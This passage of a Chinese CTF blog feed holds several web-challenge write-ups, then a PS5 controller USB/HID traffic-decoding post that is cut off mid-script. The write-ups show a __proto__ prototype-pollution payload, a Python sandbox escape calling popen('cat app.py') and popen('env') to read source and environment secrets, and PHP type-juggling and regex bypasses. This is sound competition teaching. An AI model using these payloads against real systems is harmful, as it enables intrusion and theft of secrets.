class="hljs-keyword">const</span> prop <span class="hljs-keyword">in</span> req.<span class="hljs-property">body</span>) &#123;<br>  request[prop] = req.<span class="hljs-property">body</span>[prop];<br>&#125;<br></code></pre></td></tr></table></figure><p>把请求的属性和值都给了request对象，包括原型链上的属性<br>传入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <br>  <span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2024-04-27&quot;</span><span class="hljs-punctuation">,</span> <br>  <span class="hljs-attr">&quot;year&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1945&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;bc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;debug&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在<code>if (req.body.debug &amp;&amp; !(process.env.ALLOW_USER_DEBUG === &#39;true&#39;))</code>时不会读取原型链__proto__属性，所以这里<code>req.body.debug</code>不为true，绕过了if<br>而接着经过<code>for (const prop in req.body)</code>的遍历<br>读取了原型链__proto__属性并给了request对象，所以<code>if (request.debug)</code>为true，返回flag<br><img src="/mdimg/SpringForwardCTF2024/1714394549477-f9fc4651-23d7-4948-809f-b1b5b95f6c94.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第九届中国海洋大学信息安全竞赛</title>
    <link href="/2024/04/27/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    <url>/2024/04/27/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="菜狗工具-1"><a href="#菜狗工具-1" class="headerlink" title="菜狗工具#1"></a>菜狗工具#1</h2><p>给了源码，并设置了黑名单 并设置了新的内置模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">black_list = [<br>    <span class="hljs-string">&#x27;__build_class__&#x27;</span>, <span class="hljs-string">&#x27;__debug__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <br>    <span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__spec__&#x27;</span>, <span class="hljs-string">&#x27;SystemExit&#x27;</span>,<br>    <span class="hljs-string">&#x27;breakpoint&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;memoryview&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;quit&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span><br>]<br>new_builtins = <span class="hljs-title function_">dict</span>([<br>    (key, val) <span class="hljs-keyword">for</span> key, val <span class="hljs-keyword">in</span> __builtins__.<span class="hljs-property">__dict__</span>.<span class="hljs-title function_">items</span>() <span class="hljs-keyword">if</span> key not <span class="hljs-keyword">in</span> black_list<br>])<br></code></pre></td></tr></table></figure><p>ban了常用的一些能执行代码和读文件的模块<br>实际上这题就是ssti<br><code>print([].__class__.__base__.__subclasses__())</code>找<code>&lt;class &#39;os._wrap_close&#39;&gt;</code><br><code>print([].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat app.py&#39;).read())</code>或者读环境变量<br><code>print([].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;env&#39;).read())</code><br><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714233839630-0ade03e9-0932-4420-9295-22dfea6d5ddd.png" alt="image.png"></p><h2 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O.U.C&#x27;</span>;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/_|%5f|\.|%2E/i&#x27;</span>,<span class="hljs-variable">$query</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;听说你是黑客&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;你知道b等于什么能绕过这个弱类型吗（〃｀ 3′〃）&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])&amp;&amp;<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;哎呦，不错喔&quot;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>  <span class="hljs-variable">$O_U_C</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;O_U_C&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$O_U_C</span>)&amp;&amp;<span class="hljs-variable">$O_U_C</span>!==<span class="hljs-string">&#x27;100&#x27;</span>&amp;&amp;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^100$/&#x27;</span>,<span class="hljs-variable">$O_U_C</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;but&#x27;</span>.<span class="hljs-string">&#x27;如果我寄出===阁下又该如何应对๑乛◡乛๑&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>])&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;好，那么好&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;md5&quot;</span>]===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>])))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;还是被你解出来了&#x27;</span>.<span class="hljs-string">&#x27; ྀི ྀིɞ ྀི ིྀ ིྀ&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;告诉你secret的md5值也无妨，反正哈希是不可逆的๑乛◡乛๑，除非你能箨斩攻击我&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-string">&#x27;ouc&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>      &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不过如此&#x27;</span>;<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不行嘛(´ｪ｀)&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;嗨害嗨  (๑ᵒ̴̶̷͈᷄ᗨᵒ̴̶̷͈᷅)&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>parse_str() 函数把查询字符串解析到变量中。<br><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。<br><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p></blockquote><p>可以覆盖$a的值  用0e 开头的md5 就能绕过<br>下划线get变量名可以用空格绕过<br>i<code>f (!is_array($O_U_C)&amp;&amp;$O_U_C!==&#39;100&#39;&amp;&amp;preg_match(&#39;/^100$/&#39;,$O_U_C)) </code>用换行绕过，preg_match只匹配第一行<br><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714263838358-e3da076d-98df-4899-996b-517046911c4b.png" alt="image.png"></p><h2 id="爆率真的高"><a href="#爆率真的高" class="headerlink" title="爆率真的高"></a>爆率真的高</h2><p>打开控制台发现输出一直在清除输出<br>而清除控制台输出的是<code>console</code>对象的<code>clear</code>方法<br>用Resources Saver插件来保存项目<br>在本地打开<br>观察可以发现清除的主要代码在eval里，代码被混淆了<br><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714265520046-adb6aa4d-2ff7-40f6-9ff3-a9ea783e23dc.png" alt="image.png"><br>这里考虑在eval之前把console的clear方法重写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Object.<span class="hljs-title function_ invoke__">defineProperty</span>(console, <span class="hljs-string">&#x27;clear&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: () =&gt; <span class="hljs-number">0</span>,<br>  writable: <span class="hljs-literal">true</span>,<br>  configurable: <span class="hljs-literal">true</span><br>&#125;);<br><span class="hljs-comment">// 现在Math.random总是返回1</span><br></code></pre></td></tr></table></figure><p>保存后再运行<br><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714265728924-4749e05a-fb9d-404a-9248-0a38c00200e4.png" alt="image.png"><br>在这两处下断点，可以看到前一个调用了random方法，后一个的<br><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714265892337-8c2f1878-45e5-4b1d-87c7-a04a6ada2ae0.png" alt="image.png"><br><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714265991288-f558e93b-e617-471b-925c-eae250196ac9.png" alt="image.png"><br>后一个是log方法<br>可以联想到是通过<code>random</code>不断产生随机数然后再调用<code>console.log()</code>输出<br>这里把random方法也重写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Object.<span class="hljs-title function_ invoke__">defineProperty</span>(Math, <span class="hljs-string">&#x27;random&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: () =&gt; <span class="hljs-number">1</span>,<br>  writable: <span class="hljs-literal">true</span>,<br>  configurable: <span class="hljs-literal">true</span><br>&#125;);<br><span class="hljs-comment">// 现在console.clear总是返回0</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714266250169-d57747ee-e7bc-484d-8727-49a962fd3f2d.png" alt="image.png"></p><h2 id="帕鲁服务器-1"><a href="#帕鲁服务器-1" class="headerlink" title="帕鲁服务器#1"></a>帕鲁服务器#1</h2><p>挂载vmdk(要升级vm17.5 才有Debian12镜像  进去root免密登录)<br>然后wireshark抓虚拟机的流量<br><img src="/mdimg/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/1714269567015-931ff7d8-b8a9-48bd-b400-bee27165e768.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ps5手柄usb&amp;蓝牙流量协议</title>
    <link href="/2024/04/26/ps5%E6%89%8B%E6%9F%84usb&amp;%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/04/26/ps5%E6%89%8B%E6%9F%84usb&amp;%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>打Π被手把✌锁破防了，于是斥巨资成为手把练习生。</p><h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>抓了一下手柄的流量<br>在descriptor response device 中可以找到流量所属的产品名称以及相关信息<br><img src="/mdimg/ps5/1709710507167-3fd6d33a-d169-4d84-a7c1-2ff892f1b304.png" alt="image.png"><br>可以发现每个interrupt 输入都是91byte<br>而hid data都是64byte<br><img src="/mdimg/ps5/1709710678504-0c6d99d2-e163-4025-984a-97514fdf3705.png" alt="image.png"></p><h3 id="在google寻找相关ps5-usb协议的资料"><a href="#在google寻找相关ps5-usb协议的资料" class="headerlink" title="在google寻找相关ps5 usb协议的资料"></a>在google寻找相关ps5 usb协议的资料</h3><p>找到了<a href="https://github.com/nondebug/dualsense?tab=readme-ov-file">https://github.com/nondebug/dualsense?tab=readme-ov-file</a><br>其中<a href="https://github.com/nondebug/dualsense/blob/main/dualsense-explorer.html">https://github.com/nondebug/dualsense/blob/main/dualsense-explorer.html</a> 是一个手柄测试界面，调用了webapi来连接手柄，可以实时显示手柄的输入和输出数据<br><img src="/mdimg/ps5/1709710902201-b16acf5c-0863-4f8c-a31c-4e83d04182b0.png" alt="image.png"><br>连上发现，在我把手柄放在桌子上时没有任何操作，输入有些字节一直在变化<br>往下可以看到，是陀螺仪的数据在变化，可以猜测，变化的哪些字节代表着陀螺仪的数据，而剩下大致不变字节的则是按键的数据<br><img src="/mdimg/ps5/1709711001385-fdd5a86d-6ba2-4cac-82b7-7ad8f9de5873.png" alt="image.png"></p><h3 id="根据该示例进行研究"><a href="#根据该示例进行研究" class="headerlink" title="根据该示例进行研究"></a>根据该示例进行研究</h3><p><img src="/mdimg/ps5/1709711143154-96657d57-3f38-4252-b732-94c3ea38af06.png" alt="image.png"><br>这是我抓取的一个hid data  此时我按下了十字按键（ps ：由于陀螺仪一直变化的原因，所以抓包的时候是实时的，而不是按下了某个按键才会抓取，所以流量很多)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">01</span> <span class="hljs-number">82</span> <span class="hljs-number">7</span>d <span class="hljs-number">82</span> <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">33</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> e5 <span class="hljs-number">8</span>d <span class="hljs-number">07</span> <span class="hljs-number">6</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff ff <span class="hljs-number">1</span>d <span class="hljs-number">00</span> a0 <span class="hljs-number">1</span>f fc <span class="hljs-number">4</span>d <span class="hljs-number">73</span> <span class="hljs-number">30</span> e0 <span class="hljs-number">3</span>f f8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">04</span> <span class="hljs-number">50</span> e0 <span class="hljs-number">32</span> <span class="hljs-number">91</span> <span class="hljs-number">80</span> <span class="hljs-number">9</span>e f5 <span class="hljs-number">95</span> <span class="hljs-number">00</span> c7 <span class="hljs-number">3</span>b cd <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>根据map  ：<br>第0个字节01是固定的<br>第1个字节82代表左摇杆x轴上的数据  80代表在中间位置 从左到右 最左left: 0x00   到 最右ight: 0xff<br>第2个字节代表左摇杆y轴上的数据  规则同上<br>下面第3第4字节是右摇杆的数据规则同上<br>第五第六字节代表的是左右扳机的数据 未按下时 neutral: 0x00  按到底时pressed: 0xff<br>第七字节分析流量包每一个数据发现是从第一个hid data开始往下按+1递增的<br>第8字节的0-3bit代表的是方向键（byte-&gt;bit 就是转为8位的2进制数）<br>方向规则如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">neutral</span>: <span class="hljs-number">0</span>x8, N: <span class="hljs-number">0</span>x0, NE: <span class="hljs-number">0</span>x1, E: <span class="hljs-number">0</span>x2, SE: <span class="hljs-number">0</span>x3, S: <span class="hljs-number">0</span>x4, SW: <span class="hljs-number">0</span>x5, W: <span class="hljs-number">0</span>x6, NW: <span class="hljs-number">0</span>x7<br></code></pre></td></tr></table></figure><p>这里要看后一位数字  如该字节是08 则表示没有按下，00表示按下了指向北方的按键<br>第8字节第4bit开始是右边4个图形按键的数据<br>例如我上面按下十字按键时是28<br><img src="/mdimg/ps5/1709712548062-cdf43bef-fa48-4755-a6be-3041c151b314.png" alt="image.png"><br>可能是是因为usb传输读取数据顺序的问题，这里要倒着来读 即从右往左第5bit是1<br>根据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">byte</span> <span class="hljs-number">8</span>, bit <span class="hljs-number">5</span>: Button / <span class="hljs-number">0</span>x02 - <span class="hljs-number">1</span> bit - Cross button<br></code></pre></td></tr></table></figure><p>可以知道按下了十字按键    即按下了什么按键，该对应的bit位就是1<br>后面的按键以此类推<br>如果同时按下了多个按键，分析方法也一样<br>一个简单的脚本解析按键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_hid_data</span>(<span class="hljs-params">hex_string</span>):<br>    <span class="hljs-comment"># 将十六进制字符串转换为字节串</span><br>    bytes_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)<br><br>    <span class="hljs-comment"># 解析数据包</span><br>    report_id = bytes_data[<span class="hljs-number">0</span>]<br>    left_stick_x = bytes_data[<span class="hljs-number">1</span>]<br>    left_stick_y = bytes_data[<span class="hljs-number">2</span>]<br>    right_stick_x = bytes_data[<span class="hljs-number">3</span>]<br>    right_stick_y = bytes_data[<span class="hljs-number">4</span>]<br>    l2_trigger = bytes_data[<span class="hljs-number">5</span>]<br>    r2_trigger = bytes_data[<span class="hljs-number">6</span>]<br>    vendor_defined = bytes_data[<span class="hljs-number">7</span>]<br>    <span class="hljs-comment"># 解析 Hat switch 按键</span><br>    hat_switch = bytes_data[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">0x0F</span><br>    hat_direction = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> hat_switch == <span class="hljs-number">0x0</span>:<br>        hat_direction = <span class="hljs-string">&quot;N&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x1</span>:<br>        hat_direction = <span class="hljs-string">&quot;NE&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x2</span>:<br>        hat_direction = <span class="hljs-string">&quot;E&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x3</span>:<br>        hat_direction = <span class="hljs-string">&quot;SE&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x4</span>:<br>        hat_direction = <span class="hljs-string">&quot;S&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x5</span>:<br>        hat_direction = <span class="hljs-string">&quot;SW&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x6</span>:<br>        hat_direction = <span class="hljs-string">&quot;W&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x7</span>:<br>        hat_direction = <span class="hljs-string">&quot;NW&quot;</span><br>    <span class="hljs-keyword">elif</span> hat_switch == <span class="hljs-number">0x8</span>:<br>        hat_direction = <span class="hljs-string">&quot;Neutral&quot;</span><br>    square_button = (bytes_data[<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x01</span><br>    cross_button = (bytes_data[<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0x01</span><br>    circle_button = (bytes_data[<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x01</span><br>    triangle_button = (bytes_data[<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0x01</span><br>    l1_button = bytes_data[<span class="hljs-number">9</span>] &amp; <span class="hljs-number">0x01</span><br>    r1_button = (bytes_data[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x01</span><br>    l2_button = (bytes_data[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x01</span><br>    r2_button = (bytes_data[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x01</span><br>    create_button = (bytes_data[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x01</span><br>    options_button = (bytes_data[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0x01</span><br>    l3_button = (bytes_data[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x01</span><br>    r3_button = (bytes_data[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0x01</span><br>    ps_button = bytes_data[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0x01</span><br>    touchpad_button = (bytes_data[<span class="hljs-number">10</span>] &gt;&gt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x01</span><br>    mute_button = (bytes_data[<span class="hljs-number">10</span>] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x01</span><br><br>    <span class="hljs-comment"># 输出按键状态</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Square&quot;</span> <span class="hljs-keyword">if</span> square_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Cross&quot;</span> <span class="hljs-keyword">if</span> cross_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Circle&quot;</span> <span class="hljs-keyword">if</span> circle_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span 